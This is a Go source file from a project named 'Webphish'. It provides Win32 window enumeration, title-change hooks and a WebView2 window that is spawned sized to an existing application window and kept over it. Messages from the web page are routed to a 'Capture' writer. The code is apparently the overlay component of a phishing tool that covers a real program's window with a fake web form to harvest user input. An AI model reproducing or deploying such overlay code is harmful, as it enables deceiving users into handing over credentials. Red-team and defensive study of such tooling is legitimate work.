package win

import "C"
import (
	"Webphish/internal/browser"
	"Webphish/internal/edge"
	"Webphish/internal/w32"
	"Webphish/internal/writer"
	"fmt"
	"golang.org/x/sys/windows"
	"strings"
	"syscall"
	"unsafe"
)

const (
	FilterURL    = "*://contoso.com/*"
	ResourcePath = "http://contoso.com/%s"
	MaxLength    = 1024
)

type LPARAM uintptr
type HMODULE uintptr
type DWORD uint32
type LONG int32
type WindowTitleChangeCallback func(title string, hwnd windows.HWND)

func FindWindowForClass(windowClass string) []windows.HWND {
	var result []windows.HWND
	var windowEnumerator = func(hwnd windows.HWND, arg LPARAM) int {
		className := GetWindowClassName(hwnd)
		if className == windowClass {
			result = append(result, hwnd)
		}
		return 1 // TRUE == 1, FALSE == 0. Must return TRUE to continue enumeration
	}
	cb := syscall.NewCallback(windowEnumerator)
	w32.User32EnumWindows.Call(cb, uintptr(0))
	return result
}

func FindChildWindowForClass(hwnd windows.HWND, windowClass string) (windows.HWND, bool) {
	str, _ := windows.UTF16FromString(windowClass)
	child, _, _ := w32.User32FindWindowExW.Call(uintptr(hwnd), uintptr(0), uintptr(unsafe.Pointer(&str[0])), uintptr(0))
	return windows.HWND(child), child != uintptr(0)
}

func GetForemostWindow(hwnds []windows.HWND) windows.HWND {
	result := windows.HWND(0)
	var windowEnumerator = func(hwnd windows.HWND, arg LPARAM) int {
		for _, browserHWND := range hwnds {
			if browserHWND == hwnd {
				result = browserHWND
				return 0
			}
		}
		return 1
	}
	cb := syscall.NewCallback(windowEnumerator)
	w32.User32EnumWindows.Call(cb, uintptr(0))
	return result
}

func GetChildCount(hwnd windows.HWND) int {
	count := 0
	var windowEnumerator = func(hwnd windows.HWND, arg LPARAM) int {
		count += 1
		return 1
	}
	cb := syscall.NewCallback(windowEnumerator)
	w32.User32EnumChildWindows.Call(uintptr(hwnd), cb, uintptr(0))
	return count
}

func GetWindowClassName(handle windows.HWND) string {
	buf := make([]uint16, MaxLength)
	nameLen, _, _ := w32.User32GetClassName.Call(uintptr(handle), uintptr(unsafe.Pointer(&buf[0])), MaxLength)
	if nameLen <= 0 {
		return ""
	}
	return strings.Clone(windows.UTF16ToString(buf))
}

func GetWindowText(handle windows.HWND) string {
	buf := make([]uint16, MaxLength)
	ret, _, _ := w32.User32GetWindowTextW.Call(uintptr(handle), uintptr(unsafe.Pointer(&buf[0])), MaxLength)
	if ret == 0 {
		return ""
	}
	return strings.Clone(windows.UTF16ToString(buf))
}

func GetPIDFromWindow(handle windows.HWND) int32 {
	var pid DWORD
	w32.User32GetWindowThreadProcessId.Call(uintptr(handle), uintptr(unsafe.Pointer(&pid)))
	return int32(pid)
}

func SetTitleChangedHook(pid int32, callback WindowTitleChangeCallback) {
	wndEventProc := func(
		module HMODULE, eventId DWORD, hwnd windows.HWND, objectId LONG,
		childId LONG, idEventThread DWORD, dwmsEventTime DWORD,
	) uintptr {
		myPid := int(w32.GetCurrentProcessId())
		windowPid := int(GetPIDFromWindow(hwnd))
		if myPid != windowPid {
			return 0
		}
		if int(objectId) != w32.CHILDID_SELF && int(childId) != w32.CHILDID_SELF {
			return 0
		}
		newTitle := GetWindowText(hwnd)
		if newTitle != "" {
			callback(newTitle, hwnd)
		}

		return 0
	}
	cb := syscall.NewCallback(wndEventProc)
	// https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwineventhook?redirectedfrom=MSDN
	hWinEventHook, _, _ := w32.User32SetWinEventHook.Call(
		w32.EVENT_OBJECT_NAMECHANGE, // target event min https://docs.microsoft.com/en-us/windows/win32/winauto/event-constants
		w32.EVENT_OBJECT_NAMECHANGE, // target event max
		uintptr(0),                  // handle to DLL that contains hook function, or NULL for out-of-context hook func
		cb,                          // hook func pointer
		uintptr(0),                  // pid of process to capture events from, or 0 for all
		uintptr(0),                  // id of thread to capture events from, or 0 for all
		w32.WINEVENT_OUTOFCONTEXT,   // in-context or out-of-context (DLL is in process or out of target proces) hook func
	)
	if hWinEventHook == uintptr(0) {
		//console.MessageBoxPlain("Error", "Failure to set hook")
	}
}

func SpawnWindow(resource string, parent windows.HWND, writer writer.ApplicationOutputWriter, loader edge.WebResourceRequestedCallback) edge.WebView {
	parentRect := browser.WindowRect{}
	w32.User32GetWindowRect.Call(uintptr(parent), uintptr(unsafe.Pointer(&parentRect)))

	w := browser.NewWithOptions(browser.WebViewOptions{
		Debug:     true,
		AutoFocus: true,
		WindowOptions: browser.WindowOptions{
			Title: "",
			//Width:  800,
			//Height: 600,
			Width:  uint(parentRect.BottomRightX - parentRect.TopLeftX),
			Height: uint(parentRect.BottomRightY - parentRect.TopLeftY),
			IconId: 2, // icon resource id
			Center: true,
			Parent: parent,
		},
		// WebRequestCallback: resource2.LoadResource,
		WebRequestCallback: loader,
		WebMessageCallback: writer.Capture,
	})
	w.AddWebResourceRequestedFilter(FilterURL)
	w.Navigate(fmt.Sprintf(ResourcePath, resource))
	return w
}

func FollowParent(parent windows.HWND, spawned edge.WebView, killSignal <-chan bool) {
	// disable parent window here
	for {
		// check for killSignal. if true, kill window and break for-loop
		select {
		case _ = <-killSignal:
			w32.User32PostMessage.Call(uintptr(spawned.Window()), uintptr(w32.WMClose), 0, 0)
		default:
			newCoords, success := browser.GetWindowCenterParameters(parent)
			if success {
				spawnedHwnd := windows.HWND(spawned.Window())
				w32.User32MoveWindow.Call(
					uintptr(spawnedHwnd),
					uintptr(newCoords.TopLeftX),
					uintptr(newCoords.TopLeftY),
					uintptr(newCoords.Width),
					uintptr(newCoords.Height),
					uintptr(1),
				)
			}
			continue
		}
		break
	}
	// re-enable parent window here
}

func WindowDispatcher() {
	var msg w32.Msg
	msgAvailable, _, _ := w32.User32GetMessageW.Call(
		uintptr(unsafe.Pointer(&msg)),
		0,
		0,
		0,
	)
	if msgAvailable > 0 {
		w32.User32TranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		w32.User32DispatchMessageW.Call(uintptr(unsafe.Pointer(&msg)))
	}

}
